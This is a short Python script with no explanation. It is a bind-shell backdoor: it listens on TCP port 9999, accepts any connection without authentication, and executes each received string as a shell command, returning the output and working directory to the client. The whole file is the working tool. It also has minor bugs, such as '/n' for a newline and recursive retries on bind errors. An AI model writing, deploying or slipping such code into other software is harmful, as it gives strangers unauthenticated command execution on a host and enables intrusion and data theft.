import socket
import sys
import os
import subprocess


global host
global port
global s

host = socket.gethostbyname(socket.gethostname())
port = 9999 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 




def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host,port))
        s.listen(5) 
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "/n" + "Retrying..")
        socket_bind()

socket_bind()


while True:
    conn, address = s.accept() 
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    
    while True:

        data = conn.recv(1024) 

        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except OSError:
                pass

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read() 
            output_str = str(output_bytes, "utf-8",errors="ignore")
            print(output_str)
            conn.send(str.encode(output_str + str(os.getcwd()) + '> '))
    conn.close()


